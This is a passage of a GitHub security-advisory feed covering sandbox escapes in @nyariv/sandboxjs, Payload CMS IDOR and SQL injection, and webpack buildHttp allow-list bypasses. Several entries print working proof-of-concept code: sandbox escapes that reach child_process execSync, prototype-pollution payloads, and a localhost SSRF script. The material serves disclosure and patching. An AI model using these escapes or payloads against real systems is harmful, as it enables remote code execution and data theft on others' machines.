<li><a href="https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L304-L304">https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L304-L304</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25641">https://nvd.nist.gov/vuln/detail/CVE-2026-25641</a></li>
<li><a href="https://github.com/advisories/GHSA-7x3h-rm86-3342">https://github.com/advisories/GHSA-7x3h-rm86-3342</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7x3h-rm86-3342</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-02-05T21:33:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@nyariv/sandboxjs] @nyariv/sandboxjs has a Sandbox Escape vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-66h4-qj4x-38xp</id>
        <link href="https://github.com/advisories/GHSA-66h4-qj4x-38xp"/>
        <updated>2026-02-06T21:42:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>As <code>Map</code> is in <code>SAFE_PROTOYPES</code>, it's prototype can be obtained via <code>Map.prototype</code>. By overwriting <code>Map.prototype.has</code> the sandbox can be escaped.</p>
<h3 id="details">Details</h3>
<p>This is effectively equivalent to CVE-2026-25142, but without <code>__lookupGetter__</code>  (<code>let</code> was used during testing), it turns out the <code>let</code> implementation is bugged:</p>
<pre><code class="language-js">let a = Map.prototype;
console.log(a) // undefined
</code></pre>
<pre><code class="language-js">const a = Map.prototype;
console.log(a) // Object [Map] {}
</code></pre>
<pre><code class="language-js">let a = 123;
console.log(a) // 123
</code></pre>
<pre><code class="language-js">const a = 123;
console.log(a) // 123
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">const s = require("@nyariv/sandboxjs").default;
const sb = new s();

payload = `
const m = Map.prototype;
m.has = isFinite;

console.log(
  isFinite.constructor(
    "return process.getBuiltinModule('child_process').execSync('ls -lah').toString()",
  )(),
);`;

sb.compile(payload)().run();
</code></pre>
<h3 id="impact">Impact</h3>
<p>Able to set <code>Map.prototype.has</code> -&gt; RCE</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nyariv/SandboxJS/security/advisories/GHSA-66h4-qj4x-38xp">https://github.com/nyariv/SandboxJS/security/advisories/GHSA-66h4-qj4x-38xp</a></li>
<li><a href="https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3">https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25587">https://nvd.nist.gov/vuln/detail/CVE-2026-25587</a></li>
<li><a href="https://github.com/advisories/GHSA-66h4-qj4x-38xp">https://github.com/advisories/GHSA-66h4-qj4x-38xp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-66h4-qj4x-38xp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-02-05T21:05:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@nyariv/sandboxjs] @nyariv/sandboxjs has Sandbox Escape via Prototype Whitelist Bypass and Host Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-jjpw-65fv-8g48</id>
        <link href="https://github.com/advisories/GHSA-jjpw-65fv-8g48"/>
        <updated>2026-02-06T21:42:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A sandbox escape is possible by shadowing <code>hasOwnProperty</code> on a sandbox object, which disables prototype whitelist enforcement in the property-access path. This permits direct access to <code>__proto__</code> and other blocked prototype properties, enabling <strong>host <code>Object.prototype</code> pollution</strong> and persistent cross-sandbox impact.</p>
<p>The issue was reproducible on Node <code>v23.9.0</code> using the project’s current build output. The bypass works with default <code>Sandbox</code> configuration and does not require custom globals or whitelists.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>prototypeAccess</code> uses <code>a.hasOwnProperty(b)</code> directly, which can be attacker‑controlled if the sandboxed object shadows <code>hasOwnProperty</code>. When this returns <code>true</code>, the whitelist checks are skipped.</p>
<ul>
<li><a href="https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L348">src/executor.ts:348</a>  <code>const prototypeAccess = isFunction || !(a.hasOwnProperty(b) || typeof b === 'number');</code></li>
</ul>
<img src="https://github.com/user-attachments/assets/0fa0807e-81cc-45b5-be13-bd839c974a4f" alt="image" height="593" width="1030">

<ul>
<li><a href="https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L367">src/executor.ts:367-399</a> prototype whitelist enforcement only happens when <code>prototypeAccess</code> is true.</li>
</ul>
<img src="https://github.com/user-attachments/assets/27cff24d-b892-4d56-9f59-1e5fd32ef471" alt="image" height="345" width="929">

<ul>
<li><a href="https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L220">src/executor.ts:220-233</a> mutation guard uses <code>obj.context.hasOwnProperty(...)</code>, also bypassable via shadowing.</li>
</ul>
<img src="https://github.com/user-attachments/assets/52fbb962-6ff0-4607-90a8-79fc3a50c897" alt="image" height="332" width="769">


<h2 id="proofs-of-concept">Proofs of Concept</h2>
<p> <code>node node_modules/typescript/bin/tsc --project tsconfig.json --outDir build --declaration</code>
 <code>node node_modules/rollup/dist/bin/rollup -c</code>
 Runtime target: <code>dist/node/Sandbox.js</code></p>
<h3 id="baseline-__proto__-blocked-without-bypass">Baseline: <code>__proto__</code> blocked without bypass</h3>
<pre><code class="language-js">const Sandbox = require('./dist/node/Sandbox.js').default;
const sandbox = new Sandbox();
try {
  const res = sandbox.compile(`return ({}).__proto__`)().run();
  console.log('res', res);
} catch (e) {
  console.log('error', e &amp;&amp; e.message);
}
</code></pre>
<img src="https://github.com/user-attachments/assets/bdbbbe8b-5667-46e4-b4b5-ff4693764ef9" alt="image" height="65" width="734">

<h3 id="prototype-whitelist-bypass---host-objectprototype-pollution">Prototype whitelist bypass -&gt; host <code>Object.prototype</code> pollution</h3>
<pre><code class="language-js">const Sandbox = require('./dist/node/Sandbox.js').default;
const sandbox = new Sandbox();
const code = `
  const o = { hasOwnProperty: () =&gt; true };
  const proto = o.__proto__;
  proto.polluted = 'pwned';
  return 'done';
`;

sandbox.compile(code)().run();

console.log('polluted' in ({}), ({}).polluted);
</code></pre>
<img src="https://github.com/user-attachments/assets/83471777-ee8e-4140-b702-9a575335fd30" alt="image" height="95" width="549">


<h3 id="logic-bypass-via-prototype-pollution">Logic bypass via prototype pollution</h3>
<pre><code class="language-js">const Sandbox = require('./dist/node/Sandbox.js').default;
const sandbox = new Sandbox();

sandbox.compile(`
  const o = { hasOwnProperty: () =&gt; true };
  const proto = o.__proto__;
  proto.isAdmin = true;
  return 'ok';
`)().run();

console.log('isAdmin', ({}).isAdmin === true);
</code></pre>
<img src="https://github.com/user-attachments/assets/772bb111-d3e6-4f81-8142-80228e579b57" alt="image" height="83" width="527">

<h3 id="dos-by-overriding-objectprototypetostring">DoS by overriding <code>Object.prototype.toString</code></h3>
<pre><code class="language-js">const Sandbox = require('./dist/node/Sandbox.js').default;
const sandbox = new Sandbox();

sandbox.compile(`
  const o = { hasOwnProperty: () =&gt; true };
  const proto = o.__proto__;
  proto.toString = function () { throw new Error('aaaaaaa'); };
  return 'ok';
`)().run();

try {
  String({});
} catch (e) {
  console.log('error', e.message);
}
</code></pre>
<img src="https://github.com/user-attachments/assets/eb5bff1b-ebe7-470a-abe6-d836de85ad41" alt="image" height="147" width="500">

<h3 id="rce-via-host-gadget-prototype-pollution---execsync">RCE via host gadget (prototype pollution -&gt; <code>execSync</code>)</h3>
<img src="https://github.com/user-attachments/assets/952ba404-573f-4cb7-9b70-f3294ea19b40" alt="image" height="143" width="737">


<pre><code class="language-js">const Sandbox = require('./dist/node/Sandbox.js').default;
const { execSync } = require('child_process');

const sandbox = new Sandbox();

sandbox.compile(`
  const o = { hasOwnProperty: () =&gt; true };
  const proto = o.__proto__;
  proto.cmd = 'id;
  return 'ok';
`)().run();

const obj = {}; // typical innocent object
const out = execSync(obj.cmd, { encoding: 'utf8' }).trim();
console.log(out);
</code></pre>
<h2 id="additional-finding--prototype-mutation-via-intermediate-reference">Additional Finding : Prototype mutation via intermediate reference</h2>
<p>This does <strong>not</strong> require the <code>hasOwnProperty</code> bypass. Some prototypes can be reached via allowed static access (<code>[].constructor.prototype</code>) and then mutated via a local variable, which bypasses <code>isGlobal</code> checks.</p>
<h3 id="mutate-arrayprototypefilter-without-bypass">Mutate <code>Array.prototype.filter</code> without bypass</h3>
<pre><code class="language-js">const Sandbox = require('./dist/node/Sandbox.js').default;
const sandbox = new Sandbox();

sandbox.compile(`const p = [].constructor.prototype; p.filter = 1; return 'ok';`)().run();

console.log('host filter', [1,2].filter);
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>host filter 1
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nyariv/SandboxJS/security/advisories/GHSA-jjpw-65fv-8g48">https://github.com/nyariv/SandboxJS/security/advisories/GHSA-jjpw-65fv-8g48</a></li>
<li><a href="https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3">https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25586">https://nvd.nist.gov/vuln/detail/CVE-2026-25586</a></li>
<li><a href="https://github.com/advisories/GHSA-jjpw-65fv-8g48">https://github.com/advisories/GHSA-jjpw-65fv-8g48</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjpw-65fv-8g48</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-02-05T21:04:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[payload] payload-preferences has Cross-Collection IDOR in Access Control (Multi-Auth Environments)]]></title>
        <id>https://github.com/advisories/GHSA-jq29-r496-r955</id>
        <link href="https://github.com/advisories/GHSA-jq29-r496-r955"/>
        <updated>2026-02-07T00:31:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A cross-collection Insecure Direct Object Reference (IDOR) vulnerability exists in the <code>payload-preferences</code> internal collection. In multi-auth collection environments using Postgres or SQLite with default serial/auto-increment IDs, authenticated users from one auth collection can read and delete preferences belonging to users in different auth collections when their numeric IDs collide.</p>
<p><strong>Users are affected if ALL of these are true:</strong></p>
<ul>
<li>Multiple auth collections configured (e.g., <code>admins</code> + <code>customers</code>)</li>
<li>Postgres or SQLite database adapter with serial/auto-increment IDs</li>
<li>Users in different auth collections with the same numeric ID</li>
</ul>
<p><strong>Not affected:</strong></p>
<ul>
<li><code>@payloadcms/db-mongodb</code> adapter</li>
<li>Single auth collection environments</li>
<li>Postgres/SQLite with <code>idType: 'uuid'</code></li>
</ul>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been patched in <strong>v3.74.0</strong>. Users should upgrade to v3.74.0 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround other than upgrading. Users with multiple auth collections using Postgres or SQLite with serial IDs should upgrade immediately.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-jq29-r496-r955">https://github.com/payloadcms/payload/security/advisories/GHSA-jq29-r496-r955</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25574">https://nvd.nist.gov/vuln/detail/CVE-2026-25574</a></li>
<li><a href="https://github.com/advisories/GHSA-jq29-r496-r955">https://github.com/advisories/GHSA-jq29-r496-r955</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jq29-r496-r955</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-05T21:02:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@payloadcms/drizzle] @payloadcms/drizzle has SQL Injection in JSON/RichText Queries on PostgreSQL/SQLite Adapters]]></title>
        <id>https://github.com/advisories/GHSA-xx6w-jxg9-2wh8</id>
        <link href="https://github.com/advisories/GHSA-xx6w-jxg9-2wh8"/>
        <updated>2026-02-07T00:31:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When querying JSON or richText fields, user input was directly embedded into SQL without escaping, enabling blind SQL Injection attacks. An unauthenticated attacker could extract sensitive data (emails, password reset tokens) and achieve full account takeover without password cracking.</p>
<p><strong>Users are affected if ALL of these are true:</strong></p>
<ol>
<li>Payload version &lt; v3.73.0</li>
<li>Using a Drizzle-based database adapter (<code>@payloadcms/drizzle</code> as dependency):<ul>
<li><code>@payloadcms/db-postgres</code></li>
<li><code>@payloadcms/db-vercel-postgres</code></li>
<li><code>@payloadcms/db-sqlite</code></li>
<li><code>@payloadcms/db-d1-sqlite</code></li>
</ul>
</li>
<li>At least one accessible collection that has a <code>type: 'json'</code> or <code>type: 'richText'</code> field where <code>access.read</code> returns anything other than <code>false</code> (<code>true</code> or <code>Where</code> constraint)</li>
</ol>
<p><strong>Users are NOT affected if:</strong></p>
<ul>
<li>Using <code>@payloadcms/db-mongodb</code></li>
<li>No JSON or richText fields exist in any collection</li>
<li>All JSON/richText fields have <code>access: { read: () =&gt; false }</code></li>
</ul>
<h3 id="patches">Patches</h3>
<p>Upgrade to Payload <strong>v3.73.0</strong> or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If a project cannot upgrade immediately, add <code>access: { read: () =&gt; false }</code> to all JSON and richText fields as a temporary mitigation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-xx6w-jxg9-2wh8">https://github.com/payloadcms/payload/security/advisories/GHSA-xx6w-jxg9-2wh8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25544">https://nvd.nist.gov/vuln/detail/CVE-2026-25544</a></li>
<li><a href="https://github.com/advisories/GHSA-xx6w-jxg9-2wh8">https://github.com/advisories/GHSA-xx6w-jxg9-2wh8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xx6w-jxg9-2wh8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-02-05T20:51:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@nyariv/sandboxjs] @nyariv/sandboxjs has a Sandbox Escape issue]]></title>
        <id>https://github.com/advisories/GHSA-58jh-xv4v-pcx4</id>
        <link href="https://github.com/advisories/GHSA-58jh-xv4v-pcx4"/>
        <updated>2026-02-06T21:42:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The return values of functions aren't wrapped. <code>Object.values</code>/<code>Object.entries</code> can be used to get an Array containing the host's <code>Function</code> constructor, by using <code>Array.prototype.at</code> you can obtain the hosts <code>Function</code> constructor, which can be used to execute arbitrary code outside of the sandbox.</p>
<h3 id="details">Details</h3>
<p>The return values of functions aren't wrapped, chaining function calls allows bypassing most validation/sanitization. </p>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">const s = require('@nyariv/sandboxjs').default;
const sb = new s();

payload = `
console.log(
  Object.values(this).at(0)(
    "return process.getBuiltinModule('child_process').execSync('ls -lah').toString()",
  )(),
);
`

sb.compile(payload)().run();
</code></pre>
<pre><code class="language-js">const s = require("@nyariv/sandboxjs").default;
const sb = new s();

payload = `
console.log(
  Object.entries(this)[0].at(1)(
    "return process.getBuiltinModule('child_process').execSync('ls -lah').toString()",
  )(),
);
`

sb.compile(payload)().run();
</code></pre>
<pre><code class="language-js">const s = require("@nyariv/sandboxjs").default;
const sb = new s();

payload = `
console.log(
  Object.entries(this)
    .at(0)
    .map((f) =&gt; {
      if (typeof f === 'function') {
        f.call('', 'return process')()
          .getBuiltinModule('child_process')
          .execSync('ls -lah', { stdio: 'inherit' });
      }
    }),
);
`

sb.compile(payload)().run();
</code></pre>
<pre><code class="language-js">const s = require("@nyariv/sandboxjs").default;
const sb = new s();

payload = `
const t = (f) =&gt; {
  f.call('', 'return process')()
    .getBuiltinModule('child_process')
    .execSync('ls -lah', { stdio: 'inherit' });
};
console.log(t.call(...Object.entries(this)[0]));
`

sb.compile(payload)().run();
</code></pre>
<h3 id="impact">Impact</h3>
<p>Sanbox Escape -&gt; RCE</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nyariv/SandboxJS/security/advisories/GHSA-58jh-xv4v-pcx4">https://github.com/nyariv/SandboxJS/security/advisories/GHSA-58jh-xv4v-pcx4</a></li>
<li><a href="https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3">https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25520">https://nvd.nist.gov/vuln/detail/CVE-2026-25520</a></li>
<li><a href="https://github.com/advisories/GHSA-58jh-xv4v-pcx4">https://github.com/advisories/GHSA-58jh-xv4v-pcx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-58jh-xv4v-pcx4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-02-05T20:41:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webpack] webpack buildHttp: allowedUris allow-list bypass via URL userinfo (@) leading to build-time SSRF behavior]]></title>
        <id>https://github.com/advisories/GHSA-8fgc-7cc6-rx7x</id>
        <link href="https://github.com/advisories/GHSA-8fgc-7cc6-rx7x"/>
        <updated>2026-02-06T14:39:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When <code>experiments.buildHttp</code> is enabled, webpack’s HTTP(S) resolver (<code>HttpUriPlugin</code>) can be bypassed to fetch resources from <strong>hosts outside <code>allowedUris</code></strong> by using crafted URLs that include <strong>userinfo</strong> (<code>username:password@host</code>). If <code>allowedUris</code> enforcement relies on a <strong>raw string prefix check</strong> (e.g., <code>uri.startsWith(allowed)</code>), a URL that <em>looks</em> allow-listed can pass validation while the actual network request is sent to a different authority/host after URL parsing. This is a <strong>policy/allow-list bypass</strong> that enables <strong>build-time SSRF behavior</strong> (outbound requests from the build machine to internal-only endpoints, depending on network access) and <strong>untrusted content inclusion</strong> (the fetched response is treated as module source and bundled). In my reproduction, the internal response was also persisted in the buildHttp cache.</p>
<p>Reproduced on:</p>
<ul>
<li>webpack version: <strong>5.104.0</strong></li>
<li>Node version: <strong>v18.19.1</strong></li>
</ul>
<h3 id="details">Details</h3>
<p><strong>Root cause (high level):</strong> <code>allowedUris</code> validation can be performed on the raw URI string, while the actual request destination is determined later by parsing the URL (e.g., <code>new URL(uri)</code>), which interprets the <strong>authority</strong> as the part after <code>@</code>.</p>
<p>Example crafted URL:</p>
<ul>
<li><code>http://127.0.0.1:9000@127.0.0.1:9100/secret.js</code></li>
</ul>
<p>If the allow-list is <code>["http://127.0.0.1:9000"]</code>, then:</p>
<ul>
<li>Raw string check:<br><code>crafted.startsWith("http://127.0.0.1:9000")</code> → <strong>true</strong></li>
<li>URL parsing (WHAT <code>new URL()</code> will contact):<br><code>origin</code> → <code>http://127.0.0.1:9100</code> (host/port after <code>@</code>)</li>
</ul>
<p>As a result, webpack fetches <code>http://127.0.0.1:9100/secret.js</code> even though <code>allowedUris</code> only included <code>http://127.0.0.1:9000</code>.</p>
<p><strong>Evidence from reproduction:</strong></p>
<ul>
<li>Server logs showed the internal-only endpoint being fetched:<ul>
<li><code>[internal] 200 /secret.js served (...)</code> (observed multiple times)</li>
</ul>
</li>
<li>Attacker-side build output showed:<ul>
<li>the internal secret marker was present in the <strong>bundle</strong></li>
<li>the internal secret marker was present in the <strong>buildHttp cache</strong></li>
</ul>
</li>
</ul>
<img src="https://github.com/user-attachments/assets/8fd81b35-0d4f-424b-b60e-0a2582a8b492" alt="image-2" height="381" width="1651">

<h3 id="poc">PoC</h3>
<p>This PoC is intentionally constrained to <strong>127.0.0.1</strong> (localhost-only “internal service”) to demonstrate SSRF behavior safely.</p>
<h4 id="1-setup">1) Setup</h4>
<pre><code class="language-bash">mkdir split-userinfo-poc &amp;&amp; cd split-userinfo-poc
npm init -y
npm i -D webpack webpack-cli
</code></pre>
<h4 id="2-create-serverjs">2) Create server.js</h4>
<pre><code class="language-js">#!/usr/bin/env node
"use strict";

const http = require("http");

const ALLOWED_PORT = 9000;   // allowlisted-looking host
const INTERNAL_PORT = 9100;  // actual target if bypass succeeds

const secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;
const internalPayload =
  `// internal-only\n` +
  `export const secret = ${JSON.stringify(secret)};\n` +
  `export default "ok";\n`;

function listen(port, handler) {
  return new Promise(resolve =&gt; {
    const s = http.createServer(handler);
    s.listen(port, "127.0.0.1", () =&gt; resolve(s));
  });
}

(async () =&gt; {
  // "Allowed" host (should NOT be contacted if bypass works as intended)
  await listen(ALLOWED_PORT, (req, res) =&gt; {
    console.log(`[allowed-host] ${req.method} ${req.url} (should NOT be hit in userinfo bypass)`);
    res.statusCode = 200;
    res.setHeader("Content-Type", "application/javascript; charset=utf-8");
    res.end(`export default "ALLOWED_HOST_WAS_HIT_UNEXPECTEDLY";\n`);
  });

  // Internal-only service (SSRF-like target)
  await listen(INTERNAL_PORT, (req, res) =&gt; {
    if (req.url === "/secret.js") {
      console.log(`[internal] 200 /secret.js served (secret=${secret})`);
      res.statusCode = 200;
      res.setHeader("Content-Type", "application/javascript; charset=utf-8");
      res.end(internalPayload);
      return;
    }
    console.log(`[internal] 404 ${req.method} ${req.url}`);
    res.statusCode = 404;
    res.end("not found");
  });

  console.log("\nServers up:");
  console.log(`- allowed-host (should NOT be contacted): http://127.0.0.1:${ALLOWED_PORT}/`);
  console.log(`- internal target (should be contacted if vulnerable): http://127.0.0.1:${INTERNAL_PORT}/secret.js`);
})();
</code></pre>
<h4 id="2-create-serverjs-1">2) Create server.js</h4>
<pre><code class="language-js">#!/usr/bin/env node
"use strict";

const path = require("path");
const os = require("os");
const fs = require("fs/promises");
const webpack = require("webpack");

function fmtBool(b) { return b ? "✅" : "❌"; }

async function walk(dir) {
  const out = [];
  let items;
  try { items = await fs.readdir(dir, { withFileTypes: true }); }
  catch { return out; }
  for (const it of items) {
    const p = path.join(dir, it.name);
    if (it.isDirectory()) out.push(...await walk(p));
    else if (it.isFile()) out.push(p);
  }
  return out;
}

async function fileContains(f, needle) {
  try {
    const buf = await fs.readFile(f);
    const s1 = buf.toString("utf8");
    if (s1.includes(needle)) return true;
    const s2 = buf.toString("latin1");
    return s2.includes(needle);
  } catch {
    return false;
  }
}

(async () =&gt; {
  const webpackVersion = require("webpack/package.json").version;

  const ALLOWED_PORT = 9000;
  const INTERNAL_PORT = 9100;

  // NOTE: allowlist is intentionally specified without a trailing slash
  // to demonstrate the risk of raw string prefix checks.
  const allowedUri = `http://127.0.0.1:${ALLOWED_PORT}`;

  // Crafted URL using userinfo so that:
  // - The string begins with allowedUri
  // - The actual authority (host:port) after '@' is INTERNAL_PORT
  const crafted = `http://127.0.0.1:${ALLOWED_PORT}@127.0.0.1:${INTERNAL_PORT}/secret.js`;
  const parsed = new URL(crafted);

  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), "webpack-httpuri-userinfo-poc-"));
  const srcDir = path.join(tmp, "src");
  const distDir = path.join(tmp, "dist");
  const cacheDir = path.join(tmp, ".buildHttp-cache");
  const lockfile = path.join(tmp, "webpack.lock");
  const bundlePath = path.join(distDir, "bundle.js");

  await fs.mkdir(srcDir, { recursive: true });
  await fs.mkdir(distDir, { recursive: true });

  await fs.writeFile(
    path.join(srcDir, "index.js"),
    `import { secret } from ${JSON.stringify(crafted)};
console.log("LEAKED_SECRET:", secret);
export default secret;
`
  );

  const config = {
    context: tmp,
    mode: "development",
    entry: "./src/index.js",
    output: { path: distDir, filename: "bundle.js" },
    experiments: {
      buildHttp: {
        allowedUris: [allowedUri],
        cacheLocation: cacheDir,
        lockfileLocation: lockfile,
        upgrade: true
      }
    }
  };

  console.log("\n[ENV]");
  console.log(`- webpack version: ${webpackVersion}`);
  console.log(`- node version:    ${process.version}`);
  console.log(`- allowedUris:     ${JSON.stringify([allowedUri])}`);

  console.log("\n[CRAFTED URL]");
  console.log(`- import specifier: ${crafted}`);
  console.log(`- WHAT startsWith() sees: begins with "${allowedUri}" =&gt; ${fmtBool(crafted.startsWith(allowedUri))}`);
  console.log(`- WHAT URL() parses:`);
  console.log(`  - username: ${JSON.stringify(parsed.username)} (userinfo)`);
  console.log(`  - password: ${JSON.stringify(parsed.password)} (userinfo)`);
  console.log(`  - hostname: ${parsed.hostname}`);
  console.log(`  - port:     ${parsed.port}`);
  console.log(`  - origin:   ${parsed.origin}`);
  console.log(`  - NOTE: request goes to origin above (host/port after @), not to "${allowedUri}"`);

  const compiler = webpack(config);

  compiler.run(async (err, stats) =&gt; {
    try {
      if (err) throw err;
      const info = stats.toJson({ all: false, errors: true, warnings: true });

      if (stats.hasErrors()) {
        console.error("\n[WEBPACK ERRORS]");
        console.error(info.errors);
        process.exitCode = 1;
        return;
      }

      const bundle = await fs.readFile(bundlePath, "utf8");
      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);
      const foundSecret = m ? m[0] : null;

      console.log("\n[RESULT]");
      console.log(`- temp dir:  ${tmp}`);
      console.log(`- bundle:    ${bundlePath}`);
      console.log(`- lockfile:  ${lockfile}`);
      console.log(`- cacheDir:  ${cacheDir}`);

      console.log("\n[SECURITY CHECK]");
      console.log(`- bundle contains INTERNAL_ONLY_SECRET_* : ${fmtBool(!!foundSecret)}`);

      if (foundSecret) {
        const lockHit = await fileContains(lockfile, foundSecret);

        const cacheFiles = await walk(cacheDir);
        let cacheHit = false;
        for (const f of cacheFiles) {
          if (await fileContains(f, foundSecret)) { cacheHit = true; break; }
        }

        console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);
        console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);
      }
    } catch (e) {
      console.error(e);
      process.exitCode = 1;
    } finally {
      compiler.close(() =&gt; {});
    }
  });
})();
</code></pre>
<h4 id="4-run">4) Run</h4>
<p>Terminal A:</p>
<pre><code class="language-bash">node server.js
</code></pre>
<p>Terminal B:</p>
<pre><code class="language-bash">node attacker.js
</code></pre>
<h4 id="5-expected-vs-actual">5) Expected vs Actual</h4>
<p>Expected: The import should be blocked because the effective request destination is <a href="http://127.0.0.1:9100/secret.js">http://127.0.0.1:9100/secret.js</a>, which is outside allowedUris (only <a href="http://127.0.0.1:9000">http://127.0.0.1:9000</a> is allow-listed).</p>
<p>Actual: The crafted URL passes the allow-list prefix validation, webpack fetches the internal-only resource on port 9100 (confirmed by server logs), and the secret marker appears in the bundle and buildHttp cache.</p>
<h3 id="impact">Impact</h3>
<p>Vulnerability class: Policy/allow-list bypass leading to build-time SSRF behavior and untrusted content inclusion in build outputs.</p>
<p>Who is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary. If an attacker can influence the imported HTTP(S) specifier (e.g., via source contribution, dependency manipulation, or configuration), they can cause outbound requests from the build environment to endpoints outside the allow-list (including internal-only services, subject to network reachability). The fetched response can be treated as module source and included in build outputs and persisted in the buildHttp cache, increasing the risk of leakage or supply-chain contamination.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-8fgc-7cc6-rx7x">https://github.com/webpack/webpack/security/advisories/GHSA-8fgc-7cc6-rx7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-68458">https://nvd.nist.gov/vuln/detail/CVE-2025-68458</a></li>
<li><a href="https://github.com/advisories/GHSA-8fgc-7cc6-rx7x">https://github.com/advisories/GHSA-8fgc-7cc6-rx7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8fgc-7cc6-rx7x</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-02-05T18:38:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webpack] webpack buildHttp HttpUriPlugin allowedUris bypass via HTTP redirects → SSRF + cache persistence]]></title>
        <id>https://github.com/advisories/GHSA-38r7-794h-5758</id>
        <link href="https://github.com/advisories/GHSA-38r7-794h-5758"/>
        <updated>2026-02-06T14:39:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When <code>experiments.buildHttp</code> is enabled, webpack’s HTTP(S) resolver (<code>HttpUriPlugin</code>) enforces <code>allowedUris</code> only for the <strong>initial</strong> URL, but <strong>does not re-validate <code>allowedUris</code> after following HTTP 30x redirects</strong>. As a result, an import that appears restricted to a trusted allow-list can be redirected to <strong>HTTP(S) URLs outside the allow-list</strong>. This is a <strong>policy/allow-list bypass</strong> that enables <strong>build-time SSRF behavior</strong> (requests from the build machine to internal-only endpoints, depending on network access) and <strong>untrusted content inclusion in build outputs</strong> (redirected content is treated as module source and bundled). In my reproduction, the internal response is also persisted in the buildHttp cache.</p>
<h3 id="details">Details</h3>
